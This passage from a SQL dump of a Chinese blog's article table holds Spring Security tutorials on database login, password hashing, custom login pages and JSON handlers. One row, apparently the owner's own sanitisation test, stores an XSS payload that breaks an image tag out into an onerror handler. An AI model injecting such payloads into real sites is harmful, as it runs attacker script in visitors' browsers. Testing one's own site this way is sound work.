UserDetailsPasswordService</li>\n      <li>在应用程序中初始化这个类的对象</li>\n    </ul>\n  </li>\n  <li>校验用户时：\n    <ul>\n      <li>SpringSecurity自动使用DBUserDetailsManager的loadUserByUsername方法从数据库中获取User对象</li>\n      <li>在UsernamePasswordAuthenticationFilter过滤器中的attemptAuthentication方法中将用户输入的用户名密码和从数据库中获取到的用户信息进行比较，进行用户认证</li>\n    </ul>\n  </li>\n</ul>\n<h4 id=\"3-具体实现\">(3) 具体实现</h4>\n<p>首先实现 <code>loadUserByUsername</code>实现从数据库中加载user对象</p>\n<pre><code class=\"language-java\">package cn.lilicould.securitydemo.config;\n\nimport cn.lilicould.securitydemo.entity.User;\n\npublic class DBUserDetailsManager implements UserDetailsManager, UserDetailsPasswordService {\n\n    @Resource\n    pricate UserMapper userMapper;\n\n    ...其他实现省略\n\n    @Override\n    @NullUnmarked\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n        QueryWrapper&lt;User&gt; queryWrapper = new QueryWrapper&lt;&gt;();\n        queryWrapper.eq(&quot;username&quot;, username);\n\n        // 由于username是唯一的，所以这里查询到的最多只有一条数据\n        User user = userMapper.selectOne(queryWrapper);\n\n        Collection&lt;GrantedAuthority&gt; authorities = new ArrayList&lt;&gt;();\n\n        if (user ==  null) {\n            throw new UsernameNotFoundException(&quot;用户不存在&quot;);\n        } else {\n            return new org.springframework.security.core.userdetails.User(\n                    user.getUsername(),\n                    user.getPassword(),\n                    user.getEnabled(),\n                    true, // 账号是否未过期\n                    true, // 用户凭证是否未过期\n                    true, // 账号是否未锁定\n                    authorities // 权限列表\n            );\n        }\n    }\n}\n\n</code></pre>\n<p>注意这里的返回时候使用security提供的 <code>org.springframework.security.core.userdetails.User</code>对我们获取到的User做了封装，实际使用也可以让我们自己的User实现UserDetails接口。</p>\n<p>然后在 <code>SecurityConfig</code>中配置 <code>userDetailsService</code>为 <code>DBUserDetailsManager</code>即可</p>\n<pre><code class=\"language-java\">@EnableWebSecurity\n@Configuration\npublic class SecurityConfig {\n    @Bean\n    public DBUserDetailsManager userDetailsService() {\n        // 创建基于数据库的用户档案管理器\n        return new DBUserDetailsManager();\n    }\n}\n</code></pre>\n<p>并且因为我们的 <code>DBUserDetailsManager</code>实现了 <code>UserDetailsManager</code>，而它本身又继承自 <code>UserDetailsService</code>，所以只要给 <code>DBUserDetailsManager</code>加上 <code>@Component</code>交给 Spring 管理，就不用再单独去注册一个 <code>UserDetailsService</code>了。<br>\n这样我们就完成了基于数据库的用户认证的基本配置。</p>\n<h2 id=\"三-spingsecurity的默认配置\">三. SpingSecurity的默认配置</h2>\n<h3 id=\"1-默认配置\">(1) 默认配置</h3>\n<pre><code class=\"language-java\">@Bean\npublic SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    http\n        // 1. 授权规则：所有请求都必须认证\n        .authorizeHttpRequests(authorize -&gt; authorize\n                .anyRequest().authenticated()\n        )\n        // 2. 开启默认登录页面（表单登录）\n        .formLogin(Customizer.withDefaults())\n        // 3. 开启 Basic Auth 认证（通常用于接口测试，很少使用甚至可以直接删除）\n        .httpBasic(Customizer.withDefaults());\n    // 4. 构建过滤器链\n    return http.build();\n}\n</code></pre>\n<h2 id=\"四-创建用户功能的实现\">四. 创建用户功能的实现</h2>\n<h3 id=\"1-实现方式\">1. 实现方式</h3>\n<p>前面我们的 <code>DBUserDetailsManager</code>中需要对createUser等方法进行实现，我们在其中编写如以下配置的实现：</p>\n<pre><code class=\"language-java\">@Override\npublic void createUser(UserDetails userDetails) {\n    User user = new User();\n    user.setUsername(userDetails.getUsername());\n    user.setPassword(userDetails.getPassword());\n    user.setEnabled(true);\n    userMapper.insert(user);\n}\n\n</code></pre>\n<p>其实就是将User插入到数据库中，然后在业务层中调用这个方法。但其实也可以直接在业务层把User中插入到数据库中就好了，毕竟只要数据库中有数据，我们通过 <code>loadUserByUsername()</code>能够拿到数据就可以了。包括其他的几个方法也都不是很有必要去实现。具体根据自己的习惯决定使用方法。</p>\n<h3 id=\"2-测试-1\">2. 测试</h3>\n<p>通过swagger进行测试<br>\n导入依赖</p>\n<pre><code class=\"language-xml\">&lt;dependency&gt;\n    &lt;groupId&gt;org.springdoc&lt;/groupId&gt;\n    &lt;artifactId&gt;springdoc-openapi-starter-webmvc-ui&lt;/artifactId&gt;\n    &lt;version&gt;3.0.2&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n<p>然后可以通过 <code>/swagger-ui/index.html</code>访问到接口文档并很方便地进行测试。<br>\n测试结果：<br>\n<img src=\"https://oss.lilicould.cn/file/8c70beae-02f6-4f66-9fc4-f079163a77ab_image.png\" alt=\"\" /><br>\n发现出现了403错误。这是因为Spring Security默认开启了csrf(跨站请求伪造)防护，通过以下配置临时关闭csrf防御重新测试即可。</p>\n<pre><code class=\"language-java\">@Bean\npublic SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    http\n        // 1. 授权规则：所有请求都必须认证\n        .authorizeHttpRequests(authorize -&gt; authorize\n                .anyRequest().authenticated()\n        )\n        // 2. 开启默认登录页面（表单登录）\n        .formLogin(Customizer.withDefaults())\n        // 3. 开启 Basic Auth 认证（通常用于接口测试）\n        .httpBasic(Customizer.withDefaults());\n    http.csrf(AbstractHttpConfigurer::disable);\n    // 4. 构建过滤器链\n    return http.build();\n}\n</code></pre>\n<p>重新测试结果：<br>\n<img src=\"https://oss.lilicould.cn/file/07a91bc0-bf73-4f48-9f99-633cad4d42f1_image.png\" alt=\"\" /><br>\n可以发现成功插入用户到数据库表中，但是此时密码并没有进行加密。</p>\n<h2 id=\"五-密码加密配置\">五. 密码加密配置</h2>\n<h3 id=\"1-密码加密算法\">1. 密码加密算法</h3>\n<p>见<a href=\"https://lilicould.cn/article/s/password-encryption-algorithm\">密码加密算法</a></p>\n<h3 id=\"2-passwordencoder\">2. PasswordEncoder</h3>\n<p><strong>BCryptPasswordEncoder</strong></p>\n<p>使用广泛支持的bcrypt算法来对密码进行哈希。为了增加对密码破解的抵抗力，bcrypt故意设计得较慢。和其他自适应单向函数一样，应该调整其参数，使其在您的系统上验证一个密码大约需要1秒的时间。BCryptPasswordEncoder的默认实现使用强度10。建议您在自己的系统上调整和测试强度参数，以便验证密码时大约需要1秒的时间。</p>\n<p><strong>Argon2PasswordEncoder</strong></p>\n<p>使用Argon2算法对密码进行哈希处理。Argon2是密码哈希比赛的获胜者。为了防止在自定义硬件上进行密码破解，Argon2是一种故意缓慢的算法，需要大量内存。与其他自适应单向函数一样，它应该在您的系统上调整为大约1秒来验证一个密码。当前的Argon2PasswordEncoder实现需要使用BouncyCastle库。</p>\n<p><strong>Pbkdf2PasswordEncoder</strong></p>\n<p>使用PBKDF2算法对密码进行哈希处理。为了防止密码破解，PBKDF2是一种故意缓慢的算法。与其他自适应单向函数一样，它应该在您的系统上调整为大约1秒来验证一个密码。当需要FIPS认证时，这种算法是一个很好的选择。</p>\n<p><img src=\"https://oss.lilicould.cn/file/704b2956-8848-4a38-9891-9721d6b3967a_image.png\" alt=\"\" /><br>\n<strong>SCryptPasswordEncoder</strong></p>\n<p>使用scrypt算法对密码进行哈希处理。为了防止在自定义硬件上进行密码破解，scrypt是一种故意缓慢的算法，需要大量内存。与其他自适应单向函数一样，它应该在您的系统上调整为大约1秒来验证一个密码。</p>\n<h3 id=\"3-密码加密测试\">3. 密码加密测试</h3>\n<pre><code class=\"language-java\">@Test\nvoid testPassword() {\n\n    // 工作因子，默认值是10，最小值是4，最大值是31，值越大运算速度越慢\n    PasswordEncoder encoder = new BCryptPasswordEncoder(4);\n    //明文：&quot;123456&quot;\n    //密文：result，即使明文密码相同，每次生成的密文也不一致\n    String result = encoder.encode(&quot;123456&quot;);\n    System.out.println(result);\n\n    //密码校验\n    Assert.isTrue(encoder.matches(&quot;123456&quot;, result), &quot;密码不一致&quot;);\n}\n</code></pre>\n<p>测试结果：<br>\n<img src=\"https://oss.lilicould.cn/file/868aba1f-3a19-4f71-b720-d25e832fad91_image.png\" alt=\"\" /><br>\n多次重复测试还可以发现即使明文相同，每次生成的密文也是不同的。</p>\n<h3 id=\"4-delegatingpasswordencoder\">4. DelegatingPasswordEncoder</h3>\n<ul>\n  <li>表中存储的密码形式：{bcrypt}$2a$10$GRLdNijSQMUvl/au9ofL.eDwmoohzzS7.rmNSJZ.0FxO/BTk76klW</li>\n  <li>SpringSecurity验证密码时会根据密码前缀判断以何种方式校验</li>\n  <li>目的：方便随时做密码策略的升级，兼容数据库中的老版本密码策略生成的密码</li>\n</ul>\n<h3 id=\"5-配置delegatingpasswordencoder\">5. 配置DelegatingPasswordEncoder</h3>\n<pre><code class=\"language-java\">@Bean\npublic PasswordEncoder passwordEncoder() {\n    // 创建密码编码器\n    Map&lt;String, PasswordEncoder&gt; encoders = new HashMap&lt;&gt;();\n    // 创建 BCryptPasswordEncoder\n    encoders.put(&quot;bcrypt&quot;, new BCryptPasswordEncoder());\n\n    // 创建 DelegatingPasswordEncoder，设置默认加密方式为bcrypt\n    DelegatingPasswordEncoder delegate = new DelegatingPasswordEncoder(&quot;bcrypt&quot;, encoders);\n    // 设置默认的密码编码器，当密码无{xxx}表示前缀时，使用这个编码器验证密码\n    delegate.setDefaultPasswordEncoderForMatches(new BCryptPasswordEncoder());\n    return delegate;\n}\n</code></pre>\n<h2 id=\"六-自定义登录页配置\">六. 自定义登录页配置</h2>\n<h3 id=\"1-结构搭建\">1. 结构搭建</h3>\n<p>首先搭建好自定义登录页的结构</p>\n<h4 id=\"1-logincontroller\">(1) LoginController</h4>\n<pre><code class=\"language-java\">package cn.lilicould.securitydemo.controller;\n\n@Controller\npublic class LoginController {\n\n    @GetMapping(&quot;/login&quot;)\n    public String login() {\n        return &quot;login&quot;;\n    }\n}\n\n</code></pre>\n<h4 id=\"2-视图页面\">(2) 视图页面</h4>\n<pre><code class=\"language-html\">&lt;!DOCTYPE html&gt;\n&lt;html xmlns:th=&quot;https://www.thymeleaf.org&quot;&gt;\n&lt;head&gt;\n    &lt;title&gt;登录&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;登录&lt;/h1&gt;\n&lt;div th:if=&quot;${param.error}&quot;&gt;\n    错误的用户名和密码.&lt;/div&gt;\n\n&lt;!--method必须为&quot;post&quot;--&gt;\n&lt;!--th:action=&quot;@{/login}&quot; ，\n使用动态参数，表单中会自动生成_csrf隐藏字段，用于防止csrf攻击\nlogin: 和登录页面保持一致即可，SpringSecurity自动进行登录认证--&gt;\n&lt;form th:action=&quot;@{/login}&quot; method=&quot;post&quot;&gt;\n    &lt;div&gt;\n        &lt;!--name必须为&quot;username&quot;--&gt;\n        &lt;label&gt;\n            &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;用户名&quot;/&gt;\n        &lt;/label&gt;\n    &lt;/div&gt;\n    &lt;div&gt;\n        &lt;!--name必须为&quot;password&quot;--&gt;\n        &lt;label&gt;\n            &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;密码&quot;/&gt;\n        &lt;/label&gt;\n    &lt;/div&gt;\n    &lt;input type=&quot;submit&quot; value=&quot;登录&quot; /&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<h3 id=\"2-security配置\">2. Security配置</h3>\n<p>此时启动项目，发现登录页面依旧是Security默认提供的，这是因为还需要对Security进行配置。</p>\n<pre><code class=\"language-java\">@Bean\npublic SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    http\n        // 1. 授权规则：所有请求都必须认证\n        .authorizeHttpRequests(authorize -&gt; authorize\n                .anyRequest().authenticated()\n        )\n        // 2. 开启默认登录页面（表单登录）\n        .formLogin(Customizer.withDefaults())\n        // 3. 开启 Basic Auth 认证（通常用于接口测试）\n        .httpBasic(Customizer.withDefaults());\n    http.csrf(AbstractHttpConfigurer::disable);\n    // 4. 构建过滤器链\n    return http.build();\n}\n</code></pre>\n<p>默认的配置中formLogin的配置是 <code>Customizer.withDefaults()</code>，我们需要把它改成我们mvc控制器的 <code>/login</code>。</p>\n<pre><code class=\"language-java\">@Bean\npublic SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    http\n        // 1. 授权规则：所有请求都必须认证\n        .authorizeHttpRequests(authorize -&gt; authorize\n                .anyRequest().authenticated()\n        )\n        // 2. 使用自定义的登录界面\n        .formLogin(form -&gt;\n                form.loginPage(&quot;/login&quot;)\n        )\n        // 3. 开启 Basic Auth 认证（通常用于接口测试）\n        .httpBasic(Customizer.withDefaults());\n    http.csrf(AbstractHttpConfigurer::disable);\n    // 4. 构建过滤器链\n    return http.build();\n}\n</code></pre>\n<p>此时重新启动项目，会发现提示我们重定向过多次。</p>\n<p><img src=\"https://lilicould.cn:8888/uploads/774e1e37-fdc8-4aa7-90be-5a8dd1e87d5c.png\" alt=\"重定向过多\" /><br>\n这是因为在授权规则中，所有的请求都需要认证，这也包括了 <code>/login</code>,于是这个请求会被重定向到它自己，然后继续被过滤器处理继续重定向...所以我们还需要修改授权规则，放行 <code>/login</code>请求。</p>\n<pre><code class=\"language-java\">    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            // 1. 授权规则：所有请求都必须认证\n            .authorizeHttpRequests(authorize -&gt; authorize\n                    .anyRequest().authenticated()\n            )\n            // 2. 使用自定义的登录界面\n            .formLogin(form -&gt;\n                    form.loginPage(&quot;/login&quot;).permitAll() // 加上permitAll实现无需授权即可访问\n            )\n            // 3. 开启 Basic Auth 认证（通常用于接口测试）\n            .httpBasic(Customizer.withDefaults());\n        http.csrf(AbstractHttpConfigurer::disable);\n        // 4. 构建过滤器链\n        return http.build();\n    }\n</code></pre>\n<p>这样我们就实现了自定义登录界面</p>\n<p><img src=\"https://oss.lilicould.cn/file/34de86d5-b92d-4511-9fa4-1c996f2a47cc_image.png\" alt=\"\" /></p>\n<h3 id=\"3-细节补充\">3. 细节补充</h3>\n<p>前面定义前端页面时候要求表单用户名必须使用username，密码必须使用password，但是后端进行配置之后也可以使用自定义的表单名。通过配置 <code>usernameParameter</code>和 <code>passwordParameter</code>即可使用自定义的表单名。</p>\n<pre><code class=\"language-java\">@Bean\npublic SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n    http\n        // 1. 授权规则：所有请求都必须认证\n        .authorizeHttpRequests(authorize -&gt; authorize\n                .anyRequest().authenticated()\n        )\n        // 2. 开启默认登录页面（表单登录）\n        .formLogin(form -&gt;\n                form.loginPage(&quot;/login&quot;)\n                        .permitAll()\n                        .usernameParameter(&quot;myUsername&quot;)\n                        .passwordParameter(&quot;myPassword&quot;)\n        )\n        // 3. 开启 Basic Auth 认证（通常用于接口测试）\n        .httpBasic(Customizer.withDefaults());\n    http.csrf(AbstractHttpConfigurer::disable);\n    // 4. 构建过滤器链\n    return http.build();\n  }\n)\n</code></pre>\n<p>另外校验失败的时候默认会跳转到 <code>/login?error</code>，这个默认地址也是可以修改的，和 <code>usernameParameter</code>、<code>passwordParameter</code>使用方法一样，使用 <code>failureForwardUrl</code>就可以了。</p>\n<h3 id=\"4-前后端说明\">4. 前后端说明</h3>\n<p>不管怎么修改，只要保持前后端字段一致就可以了。当然现在这些配置并不是前后端分离的，后面的内容为前后端分离架构使用Security。</p>\n<p><strong>上一章：</strong><a href=\"https://lilicould.cn/article/68\">系统学习Spring Security(一)</a></p>\n<p><strong>下一章：</strong><a href=\"https://lilicould.cn/article/72\">系统学习Spring Security(三)</a></p>\n', 'https://oss.lilicould.cn/cover/a039305b-8235-4666-8937-26c27ed3b6de_spring-security.png', 1, 46, 3, '2026-04-11 17:25:13', '2026-05-19 10:12:09', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (70, 'xss注入测试（三）', 'xss-3', 'xss', '![](/logo.jpg\" onerror=\"alert(1))\n', NULL, NULL, 2, 4, 2, '2026-04-11 21:55:04', '2026-05-19 09:33:09', 2, NULL, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (71, '密码加密算法', 'password-encryption-algorithm', '密码加密算法地一些介绍', '# 密码加密算法\n> 原文地址为[尚硅谷SpringSecurity](https://github.com/zj499063104/StudyNotes/blob/master/%E5%B0%9A%E7%A1%85%E8%B0%B7SpringSecurity%E5%92%8COAuth2%E5%AE%9E%E6%88%98%E7%B2%BE%E8%AE%B2/%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0.md)\n\n**参考文档：**[Password Storage :: Spring Security](https://docs.spring.io/spring-security/reference/features/authentication/password-storage.html)\n\n\n\n## 密码加密方式\n\n**明文密码：**\n\n最初，密码以明文形式存储在数据库中。但是恶意用户可能会通过SQL注入等手段获取到明文密码，或者程序员将数据库数据泄露的情况也可能发生。\n\n\n\n**Hash算法：**\n\nSpring Security的`PasswordEncoder`接口用于对密码进行`单向转换`，从而将密码安全地存储。对密码单向转换需要用到`哈希算法`，例如MD5、SHA-256、SHA-512等，哈希算法是单向的，`只能加密，不能解密`。\n\n因此，`数据库中存储的是单向转换后的密码`，Spring Security在进行用户身份验证时需要将用户输入的密码进行单向转换，然后与数据库的密码进行比较。\n\n因此，如果发生数据泄露，只有密码的单向哈希会被暴露。由于哈希是单向的，并且在给定哈希的情况下只能通过`暴力破解的方式猜测密码`。\n\n\n\n**彩虹表：**\n\n恶意用户创建称为`彩虹表`的查找表。\n\n```\n彩虹表就是一个庞大的、针对各种可能的字母组合预先生成的哈希值集合，有了它可以快速破解各类密码。越是复杂的密码，需要的彩虹表就越大，主流的彩虹表都是100G以上，目前主要的算法有LM, NTLM, MD5, SHA1, MYSQLSHA1, HALFLMCHALL, NTLMCHALL, ORACLE-SYSTEM, MD5-HALF。\n```\n\n\n\n**加盐密码：**\n\n为了减轻彩虹表的效果，开发人员开始使用加盐密码。不再只使用密码作为哈希函数的输入，而是为每个用户的密码生成随机字节（称为盐）。盐和用户的密码将一起经过哈希函数运算，生成一个唯一的哈希。盐将以明文形式与用户的密码一起存储。然后，当用户尝试进行身份验证时，盐和用户输入的密码一起经过哈希函数运算，再与存储的密码进行比较。唯一的盐意味着彩虹表不再有效，因为对于每个盐和密码的组合，哈希都是不同的。\n\n\n\n**自适应单向函数：**\n\n随着硬件的不断发展，加盐哈希也不再安全。原因是，计算机可以每秒执行数十亿次哈希计算。这意味着我们可以轻松地破解每个密码。\n\n现在，开发人员开始使用自适应单向函数来存储密码。使用自适应单向函数验证密码时，`故意占用资源（故意使用大量的CPU、内存或其他资源）`。自适应单向函数允许配置一个`“工作因子”`，随着硬件的改进而增加。我们建议将“工作因子”调整到系统中验证密码需要约一秒钟的时间。这种权衡是为了`让攻击者难以破解密码`。\n\n自适应单向函数包括`bcrypt、PBKDF2、scrypt和argon2`。', '<h1 id=\"密码加密算法\">密码加密算法</h1>\n<blockquote>\n  <p>原文地址为<a href=\"https://github.com/zj499063104/StudyNotes/blob/master/%E5%B0%9A%E7%A1%85%E8%B0%B7SpringSecurity%E5%92%8COAuth2%E5%AE%9E%E6%88%98%E7%B2%BE%E8%AE%B2/%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B0.md\">尚硅谷SpringSecurity</a></p>\n</blockquote>\n<p><strong>参考文档：</strong><a href=\"https://docs.spring.io/spring-security/reference/features/authentication/password-storage.html\">Password Storage :: Spring Security</a></p>\n<h2 id=\"密码加密方式\">密码加密方式</h2>\n<p><strong>明文密码：</strong></p>\n<p>最初，密码以明文形式存储在数据库中。但是恶意用户可能会通过SQL注入等手段获取到明文密码，或者程序员将数据库数据泄露的情况也可能发生。</p>\n<p><strong>Hash算法：</strong></p>\n<p>Spring Security的<code>PasswordEncoder</code>接口用于对密码进行<code>单向转换</code>，从而将密码安全地存储。对密码单向转换需要用到<code>哈希算法</code>，例如MD5、SHA-256、SHA-512等，哈希算法是单向的，<code>只能加密，不能解密</code>。</p>\n<p>因此，<code>数据库中存储的是单向转换后的密码</code>，Spring Security在进行用户身份验证时需要将用户输入的密码进行单向转换，然后与数据库的密码进行比较。</p>\n<p>因此，如果发生数据泄露，只有密码的单向哈希会被暴露。由于哈希是单向的，并且在给定哈希的情况下只能通过<code>暴力破解的方式猜测密码</code>。</p>\n<p><strong>彩虹表：</strong></p>\n<p>恶意用户创建称为<code>彩虹表</code>的查找表。</p>\n<pre><code>彩虹表就是一个庞大的、针对各种可能的字母组合预先生成的哈希值集合，有了它可以快速破解各类密码。越是复杂的密码，需要的彩虹表就越大，主流的彩虹表都是100G以上，目前主要的算法有LM, NTLM, MD5, SHA1, MYSQLSHA1, HALFLMCHALL, NTLMCHALL, ORACLE-SYSTEM, MD5-HALF。\n</code></pre>\n<p><strong>加盐密码：</strong></p>\n<p>为了减轻彩虹表的效果，开发人员开始使用加盐密码。不再只使用密码作为哈希函数的输入，而是为每个用户的密码生成随机字节（称为盐）。盐和用户的密码将一起经过哈希函数运算，生成一个唯一的哈希。盐将以明文形式与用户的密码一起存储。然后，当用户尝试进行身份验证时，盐和用户输入的密码一起经过哈希函数运算，再与存储的密码进行比较。唯一的盐意味着彩虹表不再有效，因为对于每个盐和密码的组合，哈希都是不同的。</p>\n<p><strong>自适应单向函数：</strong></p>\n<p>随着硬件的不断发展，加盐哈希也不再安全。原因是，计算机可以每秒执行数十亿次哈希计算。这意味着我们可以轻松地破解每个密码。</p>\n<p>现在，开发人员开始使用自适应单向函数来存储密码。使用自适应单向函数验证密码时，<code>故意占用资源（故意使用大量的CPU、内存或其他资源）</code>。自适应单向函数允许配置一个<code>“工作因子”</code>，随着硬件的改进而增加。我们建议将“工作因子”调整到系统中验证密码需要约一秒钟的时间。这种权衡是为了<code>让攻击者难以破解密码</code>。</p>\n<p>自适应单向函数包括<code>bcrypt、PBKDF2、scrypt和argon2</code>。</p>\n', 'https://oss.lilicould.cn/cover/7ed9ea56-bffc-41c6-a715-89879077c3fa_hero-1.png', 1, 8, 2, '2026-04-12 17:42:47', '2026-05-19 10:13:16', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (72, '系统学习Spring Security(三)', 'spring-security-study-3', 'Spring Security前后端分离篇', '# 系统学习Spring Security(三)\n\n> 通过SpringSecurity实现前后端分离架构登录。\n\n---\n\n## 一. 用户认证流程\n\n- 登录成功后调用：AuthenticationSuccessHandler\n- 登录失败后调用：AuthenticationFailureHandler\n\n![](https://oss.lilicould.cn/file/600617fe-50a1-472c-9ea4-6a2841eb83c4_657840c9-b3fb-4a76-bebb-4c94a55ab191.png)\n\n1. 认证令牌封装（①）\n   用户提交用户名和密码后，首先被封装为一个 UsernamePasswordAuthenticationToken 认证令牌对象。此时该令牌处于未认证状态。\n2. 认证核心处理（②）\n   该令牌被传递给 AuthenticationManager（认证管理器），这是认证流程的核心调度者：\n   它会调用对应的认证 provider 进行身份校验（验证账号密码是否正确）。\n   完成校验后，返回一个已认证状态的 UsernamePasswordAuthenticationToken（包含用户详情和权限）。\n3. 认证失败流程（③）\n   若 AuthenticationManager 校验失败（如密码错误、账号不存在）：\n   流程不会建立安全上下文，直接触发 AuthenticationFailureHandler（认证失败处理器），执行失败逻辑（返回JSON数据告诉前端登录失败）\n4. 认证成功流程（④）\n   若 AuthenticationManager 校验成功：\n   会话策略：执行 SessionAuthenticationStrategy，处理 Session 创建与并发登录控制（防止同一账号多点登录）。\n   上下文存储：将认证后的令牌存入 SecurityContextHolder，这是 Spring Security 全局保存当前认证用户信息的核心容器，后续整个请求生命周期都可从中获取用户身份。\n   事件发布：通过 ApplicationEventPublisher 发布认证成功事件，可用于记录日志、更新用户登录时间等业务扩展。\n   成功处理：触发 AuthenticationSuccessHandler（认证成功处理器），执行成功逻辑（这里非常重要，对于前后端分离架构，我们一般需要返回JSON格式数据到前端）\n\n通过分析可以知道。我们需要重写 `AuthenticationSuccessHandler`和 `AuthenticationFailureHandler`的处理逻辑，使其返回JSON格式数据。\n\n---\n\n## 二. 导入fastjson\n\n```xml\n<dependency>\n    <groupId>com.alibaba.fastjson2</groupId>\n    <artifactId>fastjson2</artifactId>\n    <version>2.0.61</version>\n    <scope>compile</scope>\n</dependency>\n```\n\n也可使用SpringBoot默认的jackson\n\n---\n\n## 三. 重写 `AuthenticationSuccessHandler`\n\n### 1. 创建 `MyAuthenticationSuccessHandler`\n\n```java\npublic class MyAuthenticationSuccessHandler implements AuthenticationSuccessHandler {\n\n    @Override\n    public void onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException {\n\n        Object principal = authentication.getPrincipal(); // 获取用户身份信息\n        // Object credentials = authentication.getCredentials(); // 获取用户凭证信息(密码登录就是密码)\n        // Collection<? extends GrantedAuthority> authorities = authentication.getAuthorities(); // 获取用户权限信息\n\n        Map<String, Object> result = new HashMap<>();\n\n        // 封装登录结果，这里简单用map封装\n        result.put(\"code\",0);\n        result.put(\"message\",\"登录成功\");\n        result.put(\"data\", principal);\n\n        // 转换为json格式\n        String json = JSON.toJSONString(result);\n\n        response.setContentType(\"application/json;charset=UTF-8\");\n\n        response.getWriter().write(json);\n    }\n}\n```\n\n### 2. 配置 `MyAuthenticationSuccessHandler`\n\n配置登录成功处理器为自定义的处理器\n\n```java\n  .formLogin(form ->\n        form.loginPage(\"/login\")\n              .permitAll()\n              .usernameParameter(\"myUsername\")\n              .passwordParameter(\"myPassword\")\n              .successHandler(new MyAuthenticationSuccessHandler()) // 配置为自定义的登录成功处理器\n  )\n```\n\n---\n\n## 四. 重写 `AuthenticationFailureHandler`\n\n### 1. 创建 `MyAuthenticationFailureHandler`\n\n```java\npublic class MyAuthenticationFailureHandler implements AuthenticationFailureHandler {\n\n    @Override\n    public void onAuthenticationFailure(HttpServletRequest request, HttpServletResponse response, AuthenticationException exception) throws IOException, ServletException {\n\n        String localizedMessage = exception.getLocalizedMessage(); // 获取异常的本地化信息\n\n        Map<String, Object> result = new HashMap<>();\n        result.put(\"code\",-1);\n        result.put(\"message\",localizedMessage);\n\n        String json = JSON.toJSONString(result);\n        response.setContentType(\"application/json;charset=UTF-8\");\n        response.getWriter().write(json);\n    }\n}\n```\n\n### 2. 配置 `MyAuthenticationFailureHandler`\n\n在 `.successHandler(new MyAuthenticationSuccessHandler())`后追加 `.failureHandler(new MyAuthenticationFailureHandler())`\n\n---\n\n## 五. 注销\n\n这里和登录成功、登录失败的流程差不多。\n\n## 六. 请求未认证的接口\n\n请求未认证默认会跳转登录页面，我们需要返回JSON数据\n\n### 1. 实现AuthenticationEntryPoint接口\n\n```java\npublic class MyAuthenticationEntryPoint implements AuthenticationEntryPoint {\n\n    @Override\n    public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException authException) throws IOException, ServletException {\n        //获取错误信息\n        String localizedMessage = authException.getLocalizedMessage();\n\n        //创建结果对象\n        Map<String, Object> result = new HashMap();\n        result.put(\"code\", -1);\n        result.put(\"message\", localizedMessage);\n\n        //转换成json字符串\n        String json = JSON.toJSONString(result);\n\n        //返回响应\n        response.setContentType(\"application/json;charset=UTF-8\");\n        response.getWriter().println(json);\n    }\n}\n```\n\n### 2. 配置\n\n```java\nhttp.exceptionHandling(exception ->\n        exception.authenticationEntryPoint(new MyAuthenticationEntryPoint())\n);\n```\n\n---\n\n## 七. 跨域处理\n\n### 1. 配置跨域策略\n\n```java\n@Bean\npublic CorsConfigurationSource corsConfigurationSource() {\n    CorsConfiguration config = new CorsConfiguration();\n    config.setAllowedOrigins(List.of(\"https://example.com\"));\n    config.setAllowedMethods(List.of(\"GET\", \"POST\", \"PUT\"));\n    config.setAllowedHeaders(List.of(\"*\"));\n    config.setAllowCredentials(true);\n  \n    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();\n    source.registerCorsConfiguration(\"/**\", config);\n    return source;\n}\n```\n\n### 2. 使用策略\n\n```java\nhttp.cors(cors -> cors.configurationSource(corsConfigurationSource()));\n```\n', '<h1 id=\"系统学习spring-security三\">系统学习Spring Security(三)</h1>\n<blockquote>\n  <p>通过SpringSecurity实现前后端分离架构登录。</p>\n</blockquote>\n<hr />\n<h2 id=\"一-用户认证流程\">一. 用户认证流程</h2>\n<ul>\n  <li>登录成功后调用：AuthenticationSuccessHandler</li>\n  <li>登录失败后调用：AuthenticationFailureHandler</li>\n</ul>\n<p><img src=\"https://oss.lilicould.cn/file/600617fe-50a1-472c-9ea4-6a2841eb83c4_657840c9-b3fb-4a76-bebb-4c94a55ab191.png\" alt=\"\" /></p>\n<ol>\n  <li>认证令牌封装（①）<br>\n    用户提交用户名和密码后，首先被封装为一个 UsernamePasswordAuthenticationToken 认证令牌对象。此时该令牌处于未认证状态。</li>\n  <li>认证核心处理（②）<br>\n    该令牌被传递给 AuthenticationManager（认证管理器），这是认证流程的核心调度者：<br>\n    它会调用对应的认证 provider 进行身份校验（验证账号密码是否正确）。<br>\n    完成校验后，返回一个已认证状态的 UsernamePasswordAuthenticationToken（包含用户详情和权限）。</li>\n  <li>认证失败流程（③）<br>\n    若 AuthenticationManager 校验失败（如密码错误、账号不存在）：<br>\n    流程不会建立安全上下文，直接触发 AuthenticationFailureHandler（认证失败处理器），执行失败逻辑（返回JSON数据告诉前端登录失败）</li>\n  <li>认证成功流程（④）<br>\n    若 AuthenticationManager 校验成功：<br>\n    会话策略：执行 SessionAuthenticationStrategy，处理 Session 